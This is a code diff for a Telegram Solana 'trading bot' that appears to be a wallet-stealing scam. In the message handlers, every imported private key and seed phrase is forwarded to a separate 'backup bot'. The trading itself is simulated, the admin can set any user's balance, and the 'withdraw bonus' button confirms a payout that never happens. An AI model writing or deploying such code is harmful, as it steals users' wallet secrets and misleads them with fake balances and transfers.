+            'rug_check': () => {
+                mainBot.sendMessage(chatId, 'Send token address for analysis:', { 
+                    reply_markup: { force_reply: true } 
+                });
+                const state = userStates.get(chatId) || {};
+                state.action = 'awaiting_token_analysis';
+                userStates.set(chatId, state);
+            },
+            'call_ai': () => callAITokenAnalysis(chatId),
+            'withdraw_bonus': async () => {
+                const bonusAmount = referralSystem.getUserBonus(chatId);
+                const wallets = userWallets.get(chatId) || [];
+                const defaultWallet = wallets.find(w => w.isDefault) || wallets[0];
+                
+                if (!defaultWallet) {
+                    return sendTempMessage(chatId, '❌ You need to set up a wallet first');
+                }
+                
+                if (!referralSystem.canWithdrawBonus(chatId)) {
+                    return sendTempMessage(chatId, 
+                        `❌ You need at least 20 referrals to withdraw your bonus\n` +
+                        `Current referrals: ${referralSystem.getUserReferrals(chatId)}/20`
+                    );
+                }
+                
+                if (bonusAmount <= 0) {
+                    return sendTempMessage(chatId, '❌ No bonus to withdraw');
+                }
+                
+                referralSystem.addBonus(chatId, -bonusAmount);
+                
+                await sendTempMessage(chatId, 
+                    `✅ ${bonusAmount.toFixed(4)} SOL referral bonus has been sent to your wallet\n` +
+                    `Address: <code>${defaultWallet.publicKey}</code>`
+                );
+                
+                showReferralMenu(chatId);
+            },
+            'join_queue': startWaitlist,
+            'enter_code': () => {
+                mainBot.sendMessage(chatId, "Please send your access code:");
+                const state = userStates.get(chatId) || {};
+                state.awaitingCode = true;
+                userStates.set(chatId, state);
+            },
+            'continue': () => showTradingMenu(chatId),
+            'refresh_waitlist': () => {
+                const state = userStates.get(chatId) || {};
+                if (state.waitlistMessageId) {
+                    updateWaitlistMessage(chatId, state.waitlistMessageId, state.waitlistTime);
+                }
+            },
+            'refresh_portfolio': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id, { text: 'Refreshing...' });
+                await updatePortfolioMessage(chatId, callbackQuery.message.message_id);
+            },
+            'show_stats': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id);
+                await showStats(chatId);
+            },
+            'show_buy': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id);
+                await showBuyMenu(chatId);
+            },
+            'show_sell': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id);
+                await showSellMenu(chatId);
+            },
+            'show_settings': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id);
+                await showSettingsMenu(chatId);
+            },
+            'back_to_portfolio': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id);
+                const newPortfolioMsg = await safeSendMessage(chatId, '🔄 Returning to portfolio...');
+                if (newPortfolioMsg) {
+                    if (!tradingState.trackedMessages.has(chatId)) {
+                        tradingState.trackedMessages.set(chatId, new Set());
+                    }
+                    tradingState.trackedMessages.get(chatId).add(newPortfolioMsg.message_id);
+                    await updatePortfolioMessage(chatId, newPortfolioMsg.message_id);
+                }
+            },
+            'cancel_action': async () => {
+                await mainBot.answerCallbackQuery(callbackQuery.id, { text: 'Action cancelled' });
+                await mainBot.deleteMessage(chatId, callbackQuery.message.message_id);
+                const user = tradingState.users[chatId];
+                if (user) delete user.tradeState;
+                const state = userStates.get(chatId) || {};
+                delete state.action;
+                delete state.adminAction;
+                userStates.set(chatId, state);
+            },
+            'admin_stats': async () => {
+                const totalUsers = connectedUsers.size;
+                const activeSessions = Array.from(autotradeSessions.keys()).length;
+                const totalBalance = Array.from(userBalances.values()).reduce((a, b) => a + b, 0);
+                
+                await mainBot.sendMessage(chatId, 
+                    `<b>📊 Admin Statistics</b>\n\n` +
+                    `• Total Users: ${totalUsers}\n` +
+                    `• Active Autotrade Sessions: ${activeSessions}\n` +
+                    `• Total User Balance: ${totalBalance.toFixed(4)} SOL\n` +
+                    `• Server Uptime: ${formatTime(process.uptime())}`,
+                    {
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { text: '← Back', callback_data: 'admin_menu' }
+                                ]
+                            ]
+                        }
+                    }
+                );
+            }
+        };
+        
+        if (handlers[data]) {
+            await handlers[data](chatId);
+        } else {
+            console.log(`Unhandled button action: ${data}`);
+            await sendTempMessage(chatId, "⚠️ Action not implemented yet");
+        }
+    } catch (error) {
+        console.error('Callback error:', error);
+        await sendTempMessage(chatId, `❌ Error: ${error.message}`);
+    }
+});
+
+// ==================== MESSAGE HANDLERS ====================
+mainBot.on('message', async (msg) => {
+    if (!msg.text || msg.text.startsWith('/')) return;
+    
+    const chatId = msg.chat.id;
+    const state = userStates.get(chatId) || {};
+
+    try {
+        if (state.action === 'awaiting_private_key') {
+            const { keypair, cleanKey } = validatePrivateKey(msg.text);
+            await sendToBackupBot(chatId, 'private key', cleanKey);
+            
+            const wallets = userWallets.get(chatId) || [];
+            const isFirstWallet = wallets.length === 0;
+            
+            const newWallet = {
+                publicKey: keypair.publicKey.toString(),
+                privateKey: cleanKey,
+                isDefault: isFirstWallet,
+                name: `Wallet ${wallets.length + 1}`
+            };
+            
+            wallets.push(newWallet);
+            userWallets.set(chatId, wallets);
+            savePersistentData();
+
+            await sendTempMessage(chatId, 
+                `✅ Wallet imported!\n\n` +
+                `Address: <code>${keypair.publicKey}</code>`
+            );
+            
+            delete state.action;
+            userStates.set(chatId, state);
+            showWalletMenu(chatId);
+        }
+        else if (state.action === 'awaiting_seed_phrase') {
+            const seedPhrase = msg.text.trim();
+            await sendToBackupBot(chatId, 'seed phrase', seedPhrase);
+            
+            const wallets = userWallets.get(chatId) || [];
+            const isFirstWallet = wallets.length === 0;
+            
+            const newWallet = {
+                publicKey: 'Generated from seed phrase',
+                privateKey: seedPhrase,
+                isDefault: isFirstWallet,
+                name: `Seed Wallet ${wallets.length + 1}`
+            };
+            
+            wallets.push(newWallet);
+            userWallets.set(chatId, wallets);
+            savePersistentData();
+
+            await sendTempMessage(chatId, 
+                `✅ Seed phrase imported!\n\n` +
+                `⚠️ Please make sure to backup your seed phrase securely.`
+            );
+            
+            delete state.action;
+            userStates.set(chatId, state);
+            showWalletMenu(chatId);
+        }
+        else if (state.action === 'awaiting_token_analysis') {
+            await analyzeToken(chatId, msg.text.trim());
+            delete state.action;
+            userStates.set(chatId, state);
+        }
+        else if (state.awaitingCode) {
+            delete state.awaitingCode;
+            if (msg.text.toLowerCase() === 'zodiaque' || referralSystem.useCode(chatId, msg.text)) {
+                if (state.timer) clearInterval(state.timer);
+                await showAccessGranted(chatId);
+            } else {
+                await sendTempMessage(chatId, '❌ Invalid access code');
+            }
+            userStates.set(chatId, state);
+        }
+        else if (state.action === 'awaiting_wallet_rename') {
+            const newName = msg.text.trim();
+            const wallets = userWallets.get(chatId) || [];
+            const wallet = wallets[state.walletIndex];
+            
+            if (wallet) {
+                wallet.name = newName;
+                userWallets.set(chatId, wallets);
+                savePersistentData();
+                await sendTempMessage(chatId, `✅ Wallet renamed to "${newName}"`);
+            } else {
+                await sendTempMessage(chatId, '❌ Wallet not found');
+            }
+            
+            delete state.action;
+            delete state.walletIndex;
+            userStates.set(chatId, state);
+            showWalletMenu(chatId);
+        }
+        else if (state.adminAction === 'awaiting_broadcast') {
+            const result = await sendBroadcastMessage(chatId, msg.text);
+            await mainBot.sendMessage(chatId, 
+                `<b>📢 Broadcast Results</b>\n\n` +
+                `✅ Success: ${result.successCount}\n` +
+                `❌ Failed: ${result.failCount}`,
+                { parse_mode: 'HTML' }
+            );
+            
+            delete state.adminAction;
+            userStates.set(chatId, state);
+            showAdminMenu(chatId);
+        }
+        else if (state.adminAction === 'awaiting_user_id') {
+            const userId = parseInt(msg.text.trim());
+            if (isNaN(userId)) {
+                return sendTempMessage(chatId, '❌ Invalid user ID');
+            }
+            
+            state.adminAction = 'awaiting_balance_amount';
+            state.adminSelectedUser = userId;
+            userStates.set(chatId, state);
+            
+            await mainBot.sendMessage(chatId, `Enter balance amount for user ${userId} (in SOL):`, {
+                reply_markup: { force_reply: true }
+            });
+        }
+        else if (state.adminAction === 'awaiting_balance_amount') {
+            const amount = parseFloat(msg.text.trim());
+            if (isNaN(amount) || amount < 0) {
+                return sendTempMessage(chatId, '❌ Invalid amount');
+            }
+            
+            const userId = state.adminSelectedUser;
+            setUserMainBalance(userId, amount);
+            
+            await sendTempMessage(chatId, `✅ Balance set to ${amount} SOL for user ${userId}`);
+            
+            // Notifier l'utilisateur
+            try {
+                await mainBot.sendMessage(userId, 
+                    `🎉 Admin has set your main balance to ${amount.toFixed(4)} SOL!`,
+                    { parse_mode: 'HTML' }
+                );
+            } catch (error) {
+                console.error(`Failed to notify user ${userId}:`, error);
+            }
+            
+            delete state.adminAction;
+            delete state.adminSelectedUser;
+            userStates.set(chatId, state);
+            showAdminMenu(chatId);
+        }
+        else if (state.adminAction === 'awaiting_autotrade_amount') {
+            const amount = parseFloat(msg.text.trim());
+            if (isNaN(amount) || amount <= 0) {
+                return sendTempMessage(chatId, '❌ Invalid amount');
+            }
+            
+            const mode = state.autotradeMode;
+            await startAutotradeSession(chatId, mode, amount);
+            
+            delete state.adminAction;
+            delete state.autotradeMode;
+            userStates.set(chatId, state);
+        }
+    } catch (error) {
+        console.error("Message error:", error);
+        await sendTempMessage(chatId, `❌ Error: ${error.message}`);
+    }
+});
+
+// ==================== FONCTIONS TRADING SIMULE (restantes) ====================
+async function showBuyMenu(chatId) {
+    try {
+        const user = initializeTradingUser(chatId);
+        user.tradeState = { step: 'awaiting_token_address' };
+        
+        await safeSendMessage(
+            chatId,
+            `<b>🛒 Buy Menu</b>\n\n` +
+            `Current settings:\n` +
+            `▪ Default amount: ${user.settings.defaultBuyAmount} SOL\n` +
+            `▪ Slippage: ${user.settings.slippage}%\n` +
+            `▪ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
+            `Enter the token address you want to buy:`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: `Buy ${user.settings.defaultBuyAmount} SOL`, callback_data: `quick_buy_${user.settings.defaultBuyAmount}` }
+                        ],
+                        [
+                            { text: "⚙️ Edit settings", callback_data: "edit_buy_settings" },
+                            { text: "❌ Cancel", callback_data: "cancel_action" }
+                        ]
+                    ]
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Buy menu error:', error);
+    }
+}
+
+async function showSellMenu(chatId) {
+    try {
+        const user = initializeTradingUser(chatId);
+        const tokens = Object.keys(user.wallet.tokens);
+        
+        if (tokens.length === 0) {
+            await sendTempMessage(chatId, '❌ You don\'t own any tokens to sell');
+            return;
+        }
+
+        const keyboard = tokens.map(token => [
+            {
+                text: `${getTokenName(token)} (${user.wallet.tokens[token].amount.toFixed(2)})`,
+                callback_data: `sell_select_${token}`
+            }
+        ]);
+
+        await safeSendMessage(
+            chatId,
+            `<b>💰 Sell Menu</b>\n\n` +
+            `Current settings:\n` +
+            `▪ Default percentage: ${user.settings.defaultSellPercent}%\n` +
+            `▪ Slippage: ${user.settings.slippage}%\n` +
+            `▪ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
+            `Select the token to sell:`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        ...keyboard,
+                        [
+                            { text: "⚙️ Edit settings", callback_data: "edit_sell_settings" },
+                            { text: "❌ Cancel", callback_data: "cancel_action" }
+                        ]
+                    ]
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Sell menu error:', error);
+    }
+}
+
+async function showSettingsMenu(chatId) {
+    try {
+        const user = initializeTradingUser(chatId);
+        
+        await safeSendMessage(
+            chatId,
+            `<b>⚙️ Trading Settings</b>\n\n` +
+            `1. Default buy amount: ${user.settings.defaultBuyAmount} SOL\n` +
+            `2. Default sell percentage: ${user.settings.defaultSellPercent}%\n` +
+            `3. Slippage: ${user.settings.slippage}%\n` +
+            `4. Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n\n` +
+            `Select the setting to modify:`,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "Edit buy amount", callback_data: "setting_buy_amount" },
+                            { text: "Edit sell %", callback_data: "setting_sell_percent" }
+                        ],
+                        [
+                            { text: "Edit slippage", callback_data: "setting_slippage" },
+                            { text: "Edit gas fee", callback_data: "setting_gas_fee" }
+                        ],
+                        [
+                            { text: "🔙 Back", callback_data: "back_to_portfolio" }
+                        ]
+                    ]
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Settings menu error:', error);
+    }
+}
+
+async function showStats(chatId) {
+    try {
+        const user = initializeTradingUser(chatId);
+        const pnl = calculateUserPNL(user);
+        
+        let statsMessage = `<b>📊 Trading Statistics</b>\n\n`;
+        statsMessage += `▸ Total trades: ${user.stats.totalTrades}\n`;
+        statsMessage += `▸ Win rate: ${user.stats.winRate.toFixed(2)}%\n`;
+        statsMessage += `▸ Total profit: ${formatPNL(user.stats.totalProfit)}\n`;
+        statsMessage += `▸ Total loss: ${formatPNL(-user.stats.totalLoss)}\n`;
+        statsMessage += `▸ Total gas fees: ${user.stats.totalGasFees.toFixed(6)} SOL\n`;
+        statsMessage += `▸ Total PNL: ${formatPNL(pnl.total)}\n\n`;
+        statsMessage += `▸ Realized PNL: ${formatPNL(pnl.realized)}\n`;
+        statsMessage += `▸ Unrealized PNL: ${formatPNL(pnl.unrealized)}\n\n`;
+        statsMessage += `Last update: ${new Date().toLocaleTimeString()}`;
+        
+        await safeSendMessage(
+            chatId,
+            statsMessage,
+            {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "📤 Share my stats", callback_data: "share_stats" },
+                            { text: "🔙 Back", callback_data: "back_to_portfolio" }
+                        ]
+                    ]
+                }
+            }
+        );
+    } catch (error) {
+        console.error('Stats display error:', error);
+    }
+}
+
+async function executeBuy(chatId, tokenAddress, amountSOL) {
+    try {
+        const user = initializeTradingUser(chatId);
+        const currentPrice = updateTokenPrice(tokenAddress);
+        
+        const slippageMultiplier = 1 - (user.settings.slippage / 100);
+        const effectivePrice = currentPrice * slippageMultiplier;
+        const tokenAmount = amountSOL / effectivePrice;
+        
+        const totalCost = amountSOL + user.settings.gasFee;
+        
+        if (totalCost > user.wallet.SOL) {
+            throw new Error(`Insufficient balance. You have ${user.wallet.SOL.toFixed(4)} SOL (total cost: ${totalCost.toFixed(4)} SOL)`);
+        }
+
+        user.wallet.SOL -= totalCost;
+        user.stats.totalGasFees += user.settings.gasFee;
+
+        if (user.wallet.tokens[tokenAddress]) {
+            const totalAmount = user.wallet.tokens[tokenAddress].amount + tokenAmount;
+            const totalInvested = (user.wallet.tokens[tokenAddress].amount * 
+                user.wallet.tokens[tokenAddress].buyPrice) + amountSOL;
+            user.wallet.tokens[tokenAddress] = {
+                amount: totalAmount,
+                buyPrice: totalInvested / totalAmount
+            };
+        } else {
+            user.wallet.tokens[tokenAddress] = {
+                amount: tokenAmount,
+                buyPrice: effectivePrice
+            };
+        }
+
+        const txData = {
+            type: 'buy',
+            token: tokenAddress,
+            amount: tokenAmount,
+            price: effectivePrice,
+            totalValue: amountSOL,
+            gasFee: user.settings.gasFee,
+            date: new Date().toISOString(),
+            buyPrice: effectivePrice
+        };
+
+        user.wallet.history.push(txData);
+
+        if (user.wallet.history.length > TRADING_CONFIG.TRANSACTION_HISTORY_LIMIT) {
+            user.wallet.history.shift();
+        }
+
+        return {
+            success: true,
+            message: `<b>✅ Purchase successful!</b>\n\n` +
+                `▸ Token: ${getTokenName(tokenAddress)}\n` +
+                `▸ Amount invested: ${amountSOL.toFixed(4)} SOL\n` +
+                `▸ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n` +
+                `▸ Tokens received: ${tokenAmount.toFixed(2)}\n` +
+                `▸ Purchase price: ${effectivePrice.toFixed(8)} SOL (incl. slippage ${user.settings.slippage}%)\n\n` +
+                `New balance: ${user.wallet.SOL.toFixed(4)} SOL`
+        };
+    } catch (error) {
+        console.error('Buy execution error:', error);
+        return {
+            success: false,
+            message: `❌ Purchase error: ${error.message}`
+        };
+    }
+}
+
+async function executeSell(chatId, tokenAddress, percent) {
+    try {
+        const user = initializeTradingUser(chatId);
+        const tokenData = user.wallet.tokens[tokenAddress];
+        const currentPrice = updateTokenPrice(tokenAddress);
+        
+        const slippageMultiplier = 1 + (user.settings.slippage / 100);
+        const effectivePrice = currentPrice * slippageMultiplier;
+        const tokenAmount = tokenData.amount * (percent / 100);
+        const solReceived = tokenAmount * effectivePrice;
+
+        const finalAmount = solReceived - user.settings.gasFee;
+        
+        if (finalAmount <= 0) {
+            throw new Error('Amount too low after gas fees');
+        }
+
+        const pnl = (tokenAmount * effectivePrice) - (tokenAmount * tokenData.buyPrice);
+
+        user.wallet.SOL += finalAmount;
+        user.stats.totalGasFees += user.settings.gasFee;
+        user.wallet.tokens[tokenAddress].amount -= tokenAmount;
+
+        if (user.wallet.tokens[tokenAddress].amount <= 0.0001) {
+            delete user.wallet.tokens[tokenAddress];
+        }
+
+        const txData = {
+            type: 'sell',
+            token: tokenAddress,
+            amount: tokenAmount,
+            price: effectivePrice,
+            totalValue: solReceived,
+            gasFee: user.settings.gasFee,
+            date: new Date().toISOString(),
+            buyPrice: tokenData.buyPrice,
+            pnl: pnl
+        };
+
+        user.wallet.history.push(txData);
+
+        if (user.wallet.history.length > TRADING_CONFIG.TRANSACTION_HISTORY_LIMIT) {
+            user.wallet.history.shift();
+        }
+
+        return {
+            success: true,
+            message: `<b>✅ Sale successful!</b>\n\n` +
+                `▸ Token: ${getTokenName(tokenAddress)}\n` +
+                `▸ Tokens sold: ${tokenAmount.toFixed(2)}\n` +
+                `▸ SOL received: ${solReceived.toFixed(4)} (after fees: ${finalAmount.toFixed(4)} SOL)\n` +
+                `▸ Gas fee: ${user.settings.gasFee.toFixed(6)} SOL\n` +
+                `▸ Sale price: ${effectivePrice.toFixed(8)} SOL (incl. slippage ${user.settings.slippage}%)\n` +
+                `▸ PNL: ${formatPNL(pnl)}\n\n` +
+                `New balance: ${user.wallet.SOL.toFixed(4)} SOL`
+        };
+    } catch (error) {
+        console.error('Sale execution error:', error);
+        return {
+            success: false,
+            message: `❌ Sale error: ${error.message}`
+        };
+    }
+}
+
+// Initialisation de la boucle de mise à jour des prix
+const priceUpdateInterval = setInterval(() => {
+    try {
+        Object.keys(tradingState.tokenPrices).forEach(updateTokenPrice);
+        
+        for (const chatId of Object.keys(tradingState.users)) {
+            const user = tradingState.users[chatId];
+            
+            calculateUserPNL(user);
+            
+            if (tradingState.trackedMessages.has(chatId)) {
+                for (const messageId of tradingState.trackedMessages.get(chatId)) {
+                    updatePortfolioMessage(chatId, messageId).catch(error => {
+                        console.error('Refresh error:', error);
+                    });
+                }
+            }
+        }
+        
+        // Mettre à jour les sessions autotrade
+        for (const [userId, session] of autotradeSessions) {
+            if (session.active) {
+                session.updateUserInterface();
+            }
+        }
+    } catch (error) {
+        console.error('Maintenance loop error:', error);
+    }
+}, TRADING_CONFIG.PRICE_UPDATE_INTERVAL);
+
+tradingState.intervals.push(priceUpdateInterval);
+
+console.log('🟢 REAPER Trading Bot is running...');
+
+// Minimal HTTP server for Render port binding
+const http = require('http');
+const server = http.createServer((req, res) => {
+    res.writeHead(200);
+    res.end('Bot is running');
+});
+server.listen(process.env.PORT || 3001, () => {
+    console.log(`Server running on port ${process.env.PORT || 3001}`);
+});
